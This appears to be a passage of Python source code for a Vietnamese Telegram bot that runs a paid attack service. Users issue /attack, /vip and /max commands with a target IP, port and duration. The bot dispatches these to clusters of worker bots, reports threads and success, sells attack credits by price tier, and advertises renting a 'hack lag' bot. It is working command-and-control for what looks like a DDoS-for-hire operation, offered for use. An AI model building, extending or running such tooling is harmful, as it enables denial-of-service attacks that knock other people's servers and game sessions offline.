    "║  ➕ /addv <id> <số> ➜ Cấp VIP     ║\n"
    "║  ➕ /addm <id> ➜ Cấp quyền max    ║\n"
    "║  ❌ /remove <id> ➜ Xóa quyền      ║\n"
    "║                                  ║\n"
    "║  ❖ Quản lý tự động reset        ║\n"
    "║  ──────────────────────────────  ║\n"
    "║                                  ║\n"
    "║  🤖 /auto on/off ➜ Bật/tắt auto  ║\n"
    "║  ⏹️ /stopauto    ➜ Tắt auto       ║\n"
    "║                                  ║\n"
    "║  ❖ Quản lý autocheck            ║\n"
    "║  ──────────────────────────────  ║\n"
    "║                                  ║\n"
    "║  🔍 /autocheck_all on/off        ║\n"
    "║  🔍 /autocheck_only on/off       ║\n"
    "║                                  ║\n"
    "╠══════════════════════════════════╣\n"
    "║       ◈ 𝙎𝙀𝙇𝙀𝘾𝙏 𝘼 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 ◈      ║\n"
    "║       𝘾𝙧𝙚: 𝙉𝙖𝙢𝙉𝙜𝙪𝙮𝙚𝙣 𝘿𝙚𝙫 𝙡ỏ      ║\n"
    "╚══════════════════════════════════╝\n"
    "```"
)

# ===================================================================
# MANAGER BOT
# ===================================================================

class ManagerBot:
    def __init__(self, token: str, user_client: TelegramUserClient, perm_manager: PermissionManager, user_manager: UserManager, vip_manager: VipManager):
        self.token = token
        self.user_client = user_client
        self.perm_manager = perm_manager
        self.user_manager = user_manager
        self.vip_manager = vip_manager
        self.app: Optional[Application] = None
        self._queue_processor_task: Optional[asyncio.Task] = None
        self._cleanup_task: Optional[asyncio.Task] = None
        self._autocheck_task: Optional[asyncio.Task] = None
        self._autocheck_status_counter = 0
        self._status_counter = 0
        self._last_status_results = {}
        self._waiting_for_backup = False

    async def start(self):
        request = HTTPXRequest(connection_pool_size=8, connect_timeout=20.0, read_timeout=20.0, write_timeout=20.0, pool_timeout=20.0)
        self.app = Application.builder().token(self.token).request(request).build()
        self.app.add_handler(CommandHandler("start", self.cmd_start))
        self.app.add_handler(CommandHandler("help", self.cmd_help))
        self.app.add_handler(CommandHandler("attack", self.cmd_attack))
        self.app.add_handler(CommandHandler("vip", self.cmd_vip))
        self.app.add_handler(CommandHandler("max", self.cmd_max))
        self.app.add_handler(CommandHandler("getkey", self.cmd_getkey))
        self.app.add_handler(CommandHandler("nhapkey", self.cmd_nhapkey))
        self.app.add_handler(CommandHandler("xu", self.cmd_xu))
        self.app.add_handler(CommandHandler("tluot", self.cmd_tluot))
        self.app.add_handler(CommandHandler("addt", self.cmd_addt))
        self.app.add_handler(CommandHandler("addv", self.cmd_addv))
        self.app.add_handler(CommandHandler("addm", self.cmd_addm))
        self.app.add_handler(CommandHandler("remove", self.cmd_remove))
        self.app.add_handler(CommandHandler("listperm", self.cmd_listperm))
        self.app.add_handler(CommandHandler("ng", self.cmd_admin_menu))
        self.app.add_handler(CommandHandler("status", self.cmd_status))
        self.app.add_handler(CommandHandler("groups", self.cmd_groups))
        self.app.add_handler(CommandHandler("history", self.cmd_history))
        self.app.add_handler(CommandHandler("getid", self.cmd_getid))
        self.app.add_handler(CommandHandler("id", self.cmd_id))
        self.app.add_handler(CommandHandler("stop", self.cmd_stop))
        self.app.add_handler(CommandHandler("on", self.cmd_on))
        self.app.add_handler(CommandHandler("op", self.cmd_op))
        self.app.add_handler(CommandHandler("clean", self.cmd_clean))
        self.app.add_handler(CommandHandler("upload", self.cmd_upload))
        self.app.add_handler(CommandHandler("cpu", self.cmd_cpu))
        self.app.add_handler(CommandHandler("auto", self.cmd_auto))
        self.app.add_handler(CommandHandler("stopauto", self.cmd_stopauto))
        self.app.add_handler(CommandHandler("autocheck_all", self.cmd_autocheck_all))
        self.app.add_handler(CommandHandler("autocheck_only", self.cmd_autocheck_only))
        self.app.add_handler(MessageHandler(filters.Document.ALL, self.handle_document))
        self.app.add_handler(CallbackQueryHandler(self.handle_callback_op, pattern="^op_"))
        self.app.add_handler(CallbackQueryHandler(self.handle_callback_clean, pattern="^clean_"))
        self.app.add_handler(CallbackQueryHandler(self.handle_callback_getkey, pattern="^getkey_"))
        self.app.add_handler(CallbackQueryHandler(self.handle_callback_max, pattern="^max_"))
        self.app.add_handler(CallbackQueryHandler(self.handle_callback_status, pattern="^status_"))
        self.app.add_handler(CallbackQueryHandler(self.handle_callback_reset_confirm, pattern="^reset_confirm_"))
        self.app.add_handler(CallbackQueryHandler(self.handle_callback_reset_cluster, pattern="^reset_cluster_"))
        self.app.add_handler(CallbackQueryHandler(self.handle_callback_autocheck_confirm, pattern="^autocheck_"))
        self.app.add_handler(MessageHandler(filters.StatusUpdate.NEW_CHAT_MEMBERS, self.welcome_new_members))
        state_data = get_op_state()
        state.can_send_mother_1 = state_data["mother_1"]
        state.can_send_mother_2 = state_data["mother_2"]
        state.can_send_mother_3 = state_data["mother_3"]
        state.auto_reset = state_data.get("auto_reset", False)
        logger.info(f"Loaded OP state: mother_1={state.can_send_mother_1}, mother_2={state.can_send_mother_2}, mother_3={state.can_send_mother_3}, auto_reset={state.auto_reset}")
        attack_records = self.user_manager.load_from_database()
        vip_records = self.vip_manager.load_from_database()
        logger.info(f"Loaded {len(attack_records)} attack records and {len(vip_records)} vip records from database")
        self._queue_processor_task = asyncio.create_task(self._process_log_queue())
        self._cleanup_task = asyncio.create_task(self._cleanup_reset_bots_loop())
        self._autocheck_task = asyncio.create_task(self._autocheck_loop())
        logger.info("🔄 Log queue processor started")
        logger.info("🧹 Cleanup reset bots loop started")
        logger.info("🔍 Autocheck loop started")
        for i in range(5):
            try:
                await self.app.initialize()
                break
            except (NetworkError, ConnectError) as e:
                logger.warning(f"Connection attempt {i+1}/5 failed: {e}")
                if i == 4:
                    raise
                await asyncio.sleep(5 * (i + 1))
        await self.app.start()
        await self.app.updater.start_polling()
        logger.info("Manager bot started.")
        return self

    async def _cleanup_reset_bots_loop(self):
        while True:
            try:
                await asyncio.sleep(30)
                before = len(state.pending_reset)
                state.cleanup_reset_bots()
                after = len(state.pending_reset)
                if before != after:
                    logger.info(f"🧹 Cleanup reset bots: {before} -> {after}")
            except asyncio.CancelledError:
                logger.info("🧹 Cleanup reset bots loop stopped")
                break
            except Exception as e:
                logger.error(f"Cleanup reset bots loop error: {e}")
                await asyncio.sleep(5)

    async def _autocheck_loop(self):
        while True:
            try:
                if (state.autocheck_all or state.autocheck_only) and not state.is_off:
                    try:
                        await self._autocheck_run_cycle()
                    except Exception as e:
                        logger.error(f"Autocheck run cycle error: {e}")
                    for _ in range(42):
                        await asyncio.sleep(10)
                        if not (state.autocheck_all or state.autocheck_only) or state.is_off:
                            break
                else:
                    await asyncio.sleep(10)
            except asyncio.CancelledError:
                logger.info("🔍 Autocheck loop stopped")
                break
            except Exception as e:
                logger.error(f"Autocheck loop error: {e}")
                await asyncio.sleep(60)

    async def _autocheck_check_round(self, bot_list: List[str], round_num: int) -> Dict[str, bool]:
        if not bot_list:
            return {}
        self._autocheck_status_counter += 1
        status_key = -self._autocheck_status_counter
        results = {b: False for b in bot_list}
        state.status_check_results[status_key] = {
            "pending_bots": [],
            "results": results,
            "start_time": time.time()
        }
        batch_config = BATCH_CONFIG.get("autocheck", {"batch_size": 10, "batch_delay": 1.0})
        batch_size = batch_config["batch_size"]
        batch_delay = batch_config["batch_delay"]
        for i in range(0, len(bot_list), batch_size):
            batch = bot_list[i:i+batch_size]
            for bot_username in batch:
                state.status_check_results[status_key]["pending_bots"].append(bot_username)
                try:
                    entity = await self.user_client.get_bot_entity_safe(bot_username)
                    if entity:
                        await self.user_client._ensure_connected()
                        await self.user_client.client.send_message(entity, "/start")
                        logger.info(f"📤 Autocheck round {round_num}: đã gửi /start đến {self.user_client.get_bot_display_name(bot_username)}")
                    else:
                        logger.warning(f"❌ Autocheck round {round_num}: không tìm thấy bot {bot_username}")
                except Exception as e:
                    logger.error(f"Autocheck round {round_num} send /start to {bot_username} failed: {e}")
            if i + batch_size < len(bot_list) and batch_delay > 0:
                await asyncio.sleep(batch_delay)
        start_time = time.time()
        while time.time() - start_time < STATUS_CHECK_TIMEOUT:
            status_data = state.status_check_results.get(status_key, {})
            current_results = status_data.get("results", {})
            pending = status_data.get("pending_bots", [])
            if pending and all(current_results.get(b, False) for b in pending):
                break
            await asyncio.sleep(1)
        final_results = dict(state.status_check_results.get(status_key, {}).get("results", {}))
        if status_key in state.status_check_results:
            del state.status_check_results[status_key]
        return final_results

    async def _autocheck_bots_status(self, bot_list: List[str]) -> Dict[str, bool]:
        if not bot_list:
            return {}
        round1_results = await self._autocheck_check_round(bot_list, 1)
        non_responders = [b for b in bot_list if not round1_results.get(b, False)]
        if not non_responders:
            return round1_results
        round2_results = await self._autocheck_check_round(non_responders, 2)
        final = {}
        for bot in bot_list:
            final[bot] = round1_results.get(bot, False) or round2_results.get(bot, False)
        return final

    async def _autocheck_send_to_mother(self, mother_id: int, message: str) -> bool:
        try:
            await self.user_client._ensure_connected()
            await self.user_client.client.send_message(mother_id, message)
            logger.info(f"📤 Autocheck gửi đến bot mẹ {mother_id}: {message[:100]}")
            return True
        except Exception as e:
            logger.error(f"Autocheck send to mother {mother_id} failed: {e}")
            return False

    async def _autocheck_execute_mode_a(self, clusters_offline: Dict[int, List[str]]):
        mother_ids = {
            1: int(BOT_MOTHER_GROUP_ID_1),
            2: int(BOT_MOTHER_GROUP_ID_2),
            3: int(BOT_MOTHER_GROUP_ID_3)
        }
        for cluster_num in [1, 2, 3]:
            bots = clusters_offline.get(cluster_num, [])
            if not bots:
                continue
            mother_id = mother_ids.get(cluster_num)
            if not mother_id:
                continue
            await self._autocheck_send_to_mother(mother_id, "/stopall")
            await asyncio.sleep(4)
            await self._autocheck_send_to_mother(mother_id, "/startall")
            logger.info(f"Autocheck_all: đã gửi /stopall + /startall đến Cụm {cluster_num}")

    async def _autocheck_execute_mode_b(self, clusters_offline: Dict[int, List[str]]):
        mother_ids = {
            1: int(BOT_MOTHER_GROUP_ID_1),
            2: int(BOT_MOTHER_GROUP_ID_2),
            3: int(BOT_MOTHER_GROUP_ID_3)
        }
        for cluster_num in [1, 2, 3]:
            bots = clusters_offline.get(cluster_num, [])
            if not bots:
                continue
            mother_id = mother_ids.get(cluster_num)
            if not mother_id:
                continue
            displays = [self.user_client.get_bot_display_name(b) for b in bots]
            cmd = f"/reset {' '.join(displays)}"
            await self._autocheck_send_to_mother(mother_id, cmd)
            logger.info(f"Autocheck_only: đã gửi /reset đến Cụm {cluster_num}")

    async def _autocheck_run_cycle(self):
        available_bots = state.get_available_bots_by_cluster()
        if not available_bots:
            await self.safe_send_message(
                ADMIN_ID,
                "⚠️ Autocheck: Chưa có cụm nào được cấp quyền. Vui lòng /op trước.",
                parse_mode=None
            )
            state.autocheck_all = False
            state.autocheck_only = False
            logger.warning("Autocheck: không có cụm nào được cấp quyền, tự tắt cả 2 chế độ.")
            return
        results = await self._autocheck_bots_status(available_bots)
        online = [b for b in available_bots if results.get(b, False)]
        offline = [b for b in available_bots if not results.get(b, False)]
        new_offline = [b for b in offline if b not in state.autocheck_reported_offline]
        recovered = [b for b in state.autocheck_reported_offline if b in online]
        for b in new_offline:
            state.autocheck_reported_offline.add(b)
        for b in recovered:
            state.autocheck_reported_offline.discard(b)
        if not new_offline:
            logger.info(f"🔍 Autocheck: {len(online)}/{len(available_bots)} online, không có bot mới offline.")
            return
        clusters_offline = {1: [], 2: [], 3: []}
        for bot in new_offline:
            if bot in BOT_MOTHER_1_BOTS:
                clusters_offline[1].append(bot)
            elif bot in BOT_MOTHER_2_BOTS:
                clusters_offline[2].append(bot)
            elif bot in BOT_MOTHER_3_BOTS:
                clusters_offline[3].append(bot)
        mode = "all" if state.autocheck_all else "only"
        now_str = datetime.now().strftime("%H:%M")
        mode_label = "AUTOCKECK_ALL" if mode == "all" else "AUTOCKECK_ONLY"
        lines = [f"📊 {mode_label} chu kỳ {now_str}:"]
        lines.append(f"🟢 Online: {len(online)}/{len(available_bots)} bot")
        lines.append(f"🔴 Offline: {len(new_offline)} bot")
        for cluster_num in [1, 2, 3]:
            bots = clusters_offline.get(cluster_num, [])
            if bots:
                displays = [self.user_client.get_bot_display_name(b) for b in bots]
                lines.append(f"   • {', '.join(displays)} (Cụm {cluster_num})")
        if state.auto_reset:
            lines.append("📌 Auto reset: ĐANG BẬT → tự động thực thi")
            await self.safe_send_message(ADMIN_ID, "\n".join(lines), parse_mode=None)
            if mode == "all":
                await self._autocheck_execute_mode_a(clusters_offline)
            else:
                await self._autocheck_execute_mode_b(clusters_offline)
            completion_lines = [f"✅ {mode_label} đã thực thi:"]
            if mode == "all":
                for cluster_num in [1, 2, 3]:
                    if clusters_offline.get(cluster_num):
                        completion_lines.append(f"   • Cụm {cluster_num}: /stopall → /startall")
            else:
                for cluster_num in [1, 2, 3]:
                    bots = clusters_offline.get(cluster_num, [])
                    if bots:
                        displays = [self.user_client.get_bot_display_name(b) for b in bots]
                        completion_lines.append(f"   • Cụm {cluster_num}: /reset {' '.join(displays)}")
            await self.safe_send_message(ADMIN_ID, "\n".join(completion_lines), parse_mode=None)
            logger.info(f"🔍 Autocheck {mode_label}: đã tự động thực thi cho {len(new_offline)} bot offline.")
        else:
            lines.append("📌 Auto reset: ĐANG TẮT → vui lòng xác nhận bên dưới")
            command_key = f"autocheck_{mode}_{int(time.time())}"
            state.autocheck_pending_confirm[command_key] = {
                "mode": mode,
                "clusters_offline": clusters_offline,
                "admin_chat_id": ADMIN_ID,
            }
            keyboard = [
                [
                    InlineKeyboardButton("🔄 Thực thi", callback_data=f"autocheck_{mode}_run_{command_key}"),
                    InlineKeyboardButton("❌ Hủy", callback_data=f"autocheck_{mode}_cancel_{command_key}")
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            try:
                await self.user_client.client.send_message(
                    int(ADMIN_ID),
                    "\n".join(lines),
                    reply_markup=reply_markup
                )
                logger.info(f"📨 Autocheck {mode_label}: chờ admin xác nhận cho {len(new_offline)} bot offline.")
            except Exception as e:
                logger.error(f"Failed to send autocheck confirm to admin: {e}")

    async def _process_log_queue(self):
        logger.info("🔄 Log queue processor started")
        while True:
            try:
                log_data = await log_queue_manager.get_log()
                logger.info(f"📨 ManagerBot nhận được log từ queue: {log_data.get('action')} - {log_data.get('bot_display', 'unknown')}")
                if log_data.get("action") == "log_received":
                    await self._handle_log_from_queue(log_data)
                log_queue_manager.queue.task_done()
            except asyncio.CancelledError:
                logger.info("🔄 Log queue processor stopped")
                break
            except Exception as e:
                logger.error(f"Queue processor error: {e}", exc_info=True)
                await asyncio.sleep(1)

    async def _handle_log_from_queue(self, log_data: Dict):
        try:
            bot_display = log_data.get("bot_display")
            responded = log_data.get("responded", False)
            dosage_key = log_data.get("dosage_key")
            command = log_data.get("command", "unknown")
            logger.info(f"🔍 Xử lý log từ queue: bot={bot_display}, dosage={dosage_key}, responded={responded}")
            target_key = None
            for key, pending in state.pending_attacks.items():
                expected_bots = pending.get("expected_bots", [])
                expected_displays = [self.user_client.get_bot_display_name(bot) for bot in expected_bots]
                if bot_display in expected_displays:
                    target_key = key
                    logger.info(f"✅ Tìm thấy pending attack bằng bot_display: {key}")
                    break
            if target_key is None:
                for key, pending in state.pending_attacks.items():
                    if command and pending.get("command") == command:
                        target_key = key
                        logger.info(f"✅ Tìm thấy pending attack bằng command: {key}")
                        break
            if target_key is None:
                ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', command)
                port_match = re.search(r'(\d+)$', command)
                if ip_match and port_match:
                    ip = ip_match.group(1)
                    port = port_match.group(1)
                    for key, pending in state.pending_attacks.items():
                        pending_cmd = pending.get("command", "")
                        if ip in pending_cmd and port in pending_cmd:
                            target_key = key
                            logger.info(f"✅ Tìm thấy pending attack bằng IP+Port: {key}")
                            break
            if target_key is None:
                logger.warning(f"❌ Không tìm thấy pending attack cho bot {bot_display}")
                return
            pending = state.pending_attacks[target_key]
            log_id = bot_display
            if log_id in pending["received_logs"]:
                logger.info(f"⏭️ Log từ {bot_display} đã được nhận trước đó")
                return
            pending["received_logs"].add(log_id)
            pending["results"].append({"bot_display": bot_display, "responded": responded})
            logger.info(f"✅ Đã cập nhật log {bot_display} - Tổng: {len(pending['received_logs'])}/{pending['total_expected']}")
            if len(pending["received_logs"]) >= pending["total_expected"]:
                logger.info(f"✅ Đã nhận đủ {pending['total_expected']} log, gọi _finalize_attack")
                await self._finalize_attack(target_key)
        except Exception as e:
            logger.error(f"Error handling log from queue: {e}", exc_info=True)

    def is_admin(self, user_id: int) -> bool:
        return user_id == ADMIN_ID

    def has_permission(self, user_id: int, command: str) -> bool:
        return self.perm_manager.has_permission(user_id, command)

    async def send_message_to_admin(self, text: str, parse_mode: str = None):
        try:
            await self.app.bot.send_message(chat_id=ADMIN_ID, text=text, parse_mode=parse_mode)
            return True
        except Exception as e:
            logger.error(f"Failed to send message to admin: {e}")
            return False

    async def check_off_and_group(self, update: Update) -> bool:
        user_id = update.effective_user.id
        chat_id = update.effective_chat.id
        if self.is_admin(user_id):
            return False
        if state.is_off:
            await update.message.reply_text("⚠️ Server đã tắt hoặc đang bảo trì, vui lòng chờ!")
            return True
        if chat_id != MAIN_GROUP_ID:
            await update.message.reply_text("⚠️ Bot chỉ hoạt động ở nhóm chính thức!\n👉 https://t.me/+fDRJY4ejRIIwYjNl")
            return True
        return False

    async def safe_send_message(self, chat_id: int, text: str, parse_mode: str = None, reply_to_message_id: int = None, reply_markup=None, retries: int = DEFAULT_RETRIES):
        for i in range(retries):
            try:
                await self.app.bot.send_message(chat_id=chat_id, text=text, parse_mode=parse_mode, reply_to_message_id=reply_to_message_id, reply_markup=reply_markup)
                return True
            except (TimedOut, NetworkError, ConnectError) as e:
                logger.warning(f"Network error, retry {i+1}/{retries}: {e}")
                if i < retries - 1:
                    await asyncio.sleep((2 ** i) + random.randint(0, 2))
                else:
                    raise
            except RetryAfter as e:
                await asyncio.sleep(e.retry_after)
            except Exception as e:
                logger.error(f"Send error: {e}")
                if i < retries - 1:
                    await asyncio.sleep(1)
                else:
                    raise
        return False

    def create_attack_report(self, total_responded: int, total_expected: int, ip: str, port: str, duration: str, remaining_uses: int = None) -> str:
        flow_text = f"{total_responded}/{total_expected}"
        if total_responded == 0:
            report = (
                "╔══════════════════════════════════╗\n"
                "║     ❌ 𝙁𝘼𝙄𝙇𝙀𝘿 𝘼𝙏𝙏𝘼𝘾𝙆            ║\n"
                "╠══════════════════════════════════╣\n"
                "║                                  ║\n"
                f"║  𝐓𝐚𝐫𝐠𝐞𝐭: {ip:<30} ║\n"
                f"║  𝐏𝐨𝐫𝐭: {port:<31} ║\n"
                f"║  𝐓𝐢𝐦𝐞: {duration} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬{' ' * (30 - len(duration) - 10)}║\n"
                f"║  •Luồng hoạt động: {flow_text:<28} ║\n"
                "║  •Log: Vui lòng thử lại sau.!     ║\n"
                "║                                  ║\n"
                "╚══════════════════════════════════╝"
            )
        else:
            report = (
                "╔══════════════════════════════════╗\n"
                "║     ✅ 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏𝙀𝘿          ║\n"
                "╠══════════════════════════════════╣\n"
                "║                                  ║\n"
                f"║  𝐓𝐚𝐫𝐠𝐞𝐭: {ip:<30} ║\n"
                f"║  𝐏𝐨𝐫𝐭: {port:<31} ║\n"
                f"║  𝐓𝐢𝐦𝐞: {duration} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬{' ' * (30 - len(duration) - 10)}║\n"
                f"║  •Luồng hoạt động: {flow_text:<28} ║\n"
            )
            if remaining_uses is not None:
                report += f"║  •Lượt còn lại: {remaining_uses:<26} ║\n"
            report += "║                                  ║\n╚══════════════════════════════════╝"
        return report

    def _create_vip_report(self, total_responded: int, total_expected: int, ip: str, port: str, duration: str, remaining_uses: int = None) -> str:
        success = total_responded > 0
        status_text = "Success ✓" if success else "Failed ✗"
        report = (
            "============================================================\n"
            "██╗   ██╗██╗██████╗ \n"
            "██║   ██║██║██╔══██╗\n"
            "██║   ██║██║██████╔╝\n"
            "╚██╗ ██╔╝██║██╔═══╝ \n"
            " ╚████╔╝ ██║██║     \n"
            "  ╚═══╝  ╚═╝╚═╝     \n"
            "\n"
            "          ┌──── 𝑵𝒂𝒎𝑵𝒈𝒖𝒚𝒆𝒏 𝑫𝒛 ────┐\n"
            "------------------------------------------------------------\n"
            f"  » 𝑺𝑻𝑨𝑻𝑼𝑺   : {status_text}\n"
            f"  » 𝑰𝑷       : {ip}\n"
            f"  » 𝑷𝑶𝑹𝑻     : {port}\n"
            f"  » 𝑻𝑰𝑴𝑬     : {duration}S\n"
            f"  » 𝑻𝑯𝑹𝑬𝑨𝑫𝑺  : {total_responded}/{total_expected}\n"
            "------------------------------------------------------------\n"
            "          └──── 𝑷𝑹𝑶𝑪𝑬𝑺𝑺 𝑪𝑶𝑴𝑷𝑳𝑬𝑻𝑬𝑫 ────┘\n"
            "============================================================"
        )
        return report

    def _create_max_report(self, total_responded: int, total_expected: int, ip: str, port: str, duration: str) -> str:
        success = total_responded > 0
        status_text = "SUCCESS ✓" if success else "FAILED ✗"
        total_blocks = 10
        filled = int(round((total_responded / total_expected) * total_blocks)) if total_expected > 0 else 0
        filled = min(filled, total_blocks)
        empty = total_blocks - filled
        progress_bar = "█" * filled + "░" * empty
        thread_str = f"{total_responded}/{total_expected} [{progress_bar}]"

        report = (
            "╔══════════════════════════════════════════════╗\n"
            "║  ██   ██ ███   ███ █████  ██   ██            ║\n"
            "║  ██   ██ ████ ████ ██  ██  ██ ██             ║\n"
            "║   ██ ██  ██ ███ ██ ██████   ███              ║\n"
            "║   ██ ██  ██  █  ██ ██  ██  ██ ██             ║\n"
            "║    ███   ██     ██ ██  ██ ██   ██            ║\n"
            "╠══════════════════════════════════════════════╣\n"
            "║              [ NamNguyen Dz ]                ║\n"
            "------------------------------------------------\n"
            f"║  » STATUS   : {status_text:<39} ║\n"
            f"║  » IP       : {ip:<39} ║\n"
            f"║  » PORT     : {port:<39} ║\n"
            f"║  » TIME     : {duration}s{' ' * (37 - len(str(duration)))} ║\n"
            f"║  » THREADS  : {thread_str:<39} ║\n"
            "╚══════════════════════════════════════════════╝"
        )
        return report

    async def welcome_new_members(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_chat.id != MAIN_GROUP_ID:
            return
        for new_member in update.message.new_chat_members:
            if new_member.is_bot:
                continue
            user_id = new_member.id
            username = new_member.username or "Không có username"
            first_name = new_member.first_name or "Không có tên"
            welcome_text = (
                f"🎉 <b>Chào mừng</b>: {first_name} ✅\n"
                f"🆔 <b>ID</b>: <code>{user_id}</code> ☑️\n"
                f"😀 <b>Username</b>: @{username}\n\n"
                f"📌 Dùng lệnh <code>/help</code> để xem danh sách lệnh.\n"
                f"👨‍💻 Nếu bạn cần nâng cấp hoặc thuê bot hack lag hãy nhắn cho admin để được hỗ trợ."
            )
            if ADMIN_USERNAME:
                keyboard = [[InlineKeyboardButton("👤 Liên hệ Admin", url=f"https://t.me/{ADMIN_USERNAME}")]]
                reply_markup = InlineKeyboardMarkup(keyboard)
            else:
                reply_markup = None
            await update.message.reply_text(welcome_text, parse_mode="HTML", reply_markup=reply_markup)
            break

    async def send_validation_error(self, chat_id: int, user_id: int, reply_to_message_id: int = None):
        await self.safe_send_message(
            chat_id,
            "❌ IP, Port hoặc Time không hợp lệ. Vui lòng kiểm tra lại.\n"
            "•Lệnh /attack không cần nhập time, time mặc định là 50s",
            reply_to_message_id=reply_to_message_id
        )
        help_msg = (
            "📌 Cú pháp đúng:\n"
            "  /attack <ip> <port>\n"
            "  /vip <ip> <port> <time>  (1-60 giây)\n"
            "  /max <ip> <port> <time>\n\n"
            "⚠️ Lưu ý: Chỉ nhập IP, Port, Time. Không thêm ký tự đặc biệt."
        )
        await self.safe_send_message(
            chat_id,
            help_msg,
            reply_to_message_id=reply_to_message_id
        )

    def _get_vip_price_list_text(self) -> str:
        price_list = (
            "```\n"
            "┌────────────┬──────────────┬──────────────┐\n"
            "│  Số mua    │ Đơn giá/lần  │ Thành tiền   │\n"
            "├────────────┼──────────────┼──────────────┤\n"
            "│  1 lần     │ 6,000 VND    │ 6,000 VND    │\n"
            "│  5 lần     │ 5,500 VND    │ 27,500 VND   │\n"
            "│ 10 lần     │ 5,000 VND    │ 50,000 VND   │\n"
            "│ 20 lần     │ 4,500 VND    │ 90,000 VND   │\n"
            "└────────────┴──────────────┴──────────────┘\n"
            "```"
        )
        return price_list

    async def cmd_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if await self.check_off_and_group(update):
            return
        await self.safe_send_message(
            update.effective_chat.id,
            MENU_TEXT,
            parse_mode="MarkdownV2",
            reply_to_message_id=update.message.message_id
        )

    async def cmd_help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if await self.check_off_and_group(update):
            return
        await self.safe_send_message(
            update.effective_chat.id,
            MENU_TEXT,
            parse_mode="MarkdownV2",
            reply_to_message_id=update.message.message_id
        )

    async def cmd_stop(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self.is_admin(user_id):
            await self.safe_send_message(update.effective_chat.id, "❌ Bạn không có quyền.", reply_to_message_id=update.message.message_id)
            return
        try:
            data = export_all_data()
            json_data = json.dumps(data, indent=2, ensure_ascii=False, default=str)
            filename = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            await self.app.bot.send_document(
                chat_id=update.effective_chat.id,
                document=json_data.encode('utf-8'),
                filename=filename,
                caption=f"📦 Backup dữ liệu ngày {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}"
            )
            logger.info(f"Backup data sent to admin {user_id}")
        except Exception as e:
            logger.error(f"Backup error: {e}")
            await self.safe_send_message(update.effective_chat.id, f"❌ Lỗi khi tạo backup: {str(e)}", reply_to_message_id=update.message.message_id)
            return
        state.is_off = True
        await self.send_message_to_admin("🔴 Bot đã được tắt!\n📌 Dùng /on để bật lại.")
        logger.info(f"Bot STOP by admin {user_id}")

    async def cmd_upload(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self.is_admin(user_id):
            await self.safe_send_message(update.effective_chat.id, "❌ Bạn không có quyền.", reply_to_message_id=update.message.message_id)
            return
        self._waiting_for_backup = True
        await self.safe_send_message(
            update.effective_chat.id,
            "📤 Vui lòng gửi file backup JSON (từ /stop) để khôi phục dữ liệu.\n"
            "Bot sẽ xóa dữ liệu cũ và thay thế bằng dữ liệu trong file."
        )

    async def cmd_cpu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self.is_admin(user_id):
            await self.safe_send_message(update.effective_chat.id, "❌ Bạn không có quyền.", reply_to_message_id=update.message.message_id)
            return
        try:
            import psutil
            cpu_percent = psutil.cpu_percent(interval=0.5)
            mem = psutil.virtual_memory()
            mem_total = mem.total / (1024 ** 3)
            mem_used = mem.used / (1024 ** 3)
            mem_percent = mem.percent
            msg = (
                f"🖥️ **Thông tin hệ thống**\n\n"
                f"⚡ **CPU:** {cpu_percent}%\n"
                f"🧠 **RAM:** {mem_percent}% ({mem_used:.2f}GB / {mem_total:.2f}GB)\n"
            )
            await self.safe_send_message(update.effective_chat.id, msg, parse_mode="Markdown")
        except ImportError:
            try:
                with open("/proc/loadavg", "r") as f:
                    load = f.read().split()
                    cpu_load = load[0]
                with open("/proc/meminfo", "r") as f:
                    lines = f.readlines()
                    mem_total = int(lines[0].split()[1]) / (1024 * 1024)
                    mem_free = int(lines[1].split()[1]) / (1024 * 1024)
                    mem_used = mem_total - mem_free
                    mem_percent = (mem_used / mem_total) * 100
                msg = (
                    f"🖥️ **Thông tin hệ thống**\n\n"
                    f"⚡ **CPU Load:** {cpu_load}\n"
                    f"🧠 **RAM:** {mem_percent:.1f}% ({mem_used:.2f}GB / {mem_total:.2f}GB)\n"
                )
                await self.safe_send_message(update.effective_chat.id, msg, parse_mode="Markdown")
            except Exception as e:
                await self.safe_send_message(update.effective_chat.id, f"❌ Không thể lấy thông tin hệ thống: {e}")
        except Exception as e:
            await self.safe_send_message(update.effective_chat.id, f"❌ Lỗi: {e}")

    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self.is_admin(user_id):
            return
        if not self._waiting_for_backup:
            return
        document = update.message.document
        if not document:
            return
        if not document.file_name.endswith('.json'):
            await update.message.reply_text("❌ Vui lòng gửi file JSON hợp lệ.")
            return
        try:
            file = await self.app.bot.get_file(document.file_id)
            content = await file.download_as_bytearray()
            data = json.loads(content.decode('utf-8'))
            required_tables = ['keys', 'op_state', 'user_usage', 'getkey_usage', 'permissions']
            if not all(table in data for table in required_tables):
                await update.message.reply_text("❌ File không đúng định dạng (thiếu bảng).")
                self._waiting_for_backup = False
                return
            if import_all_data(data):
                await update.message.reply_text("✅ Đã khôi phục dữ liệu thành công từ file backup!")
                logger.info(f"Data restored by admin {user_id}")
            else:
                await update.message.reply_text("❌ Lỗi khi khôi phục dữ liệu. Vui lòng kiểm tra log.")
        except json.JSONDecodeError:
            await update.message.reply_text("❌ File JSON không hợp lệ.")
        except Exception as e:
            logger.error(f"Restore error: {e}")
            await update.message.reply_text(f"❌ Lỗi khi xử lý file: {str(e)}")
        finally:
            self._waiting_for_backup = False

    async def cmd_on(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if not self.is_admin(user_id):
            await self.safe_send_message(update.effective_chat.id, "❌ Bạn không có quyền.", reply_to_message_id=update.message.message_id)
            return
        state.is_off = False
        if update.effective_chat.id == MAIN_GROUP_ID:
            await self.safe_send_message(update.effective_chat.id, "✅ Bot đã được bật.", reply_to_message_id=update.message.message_id)
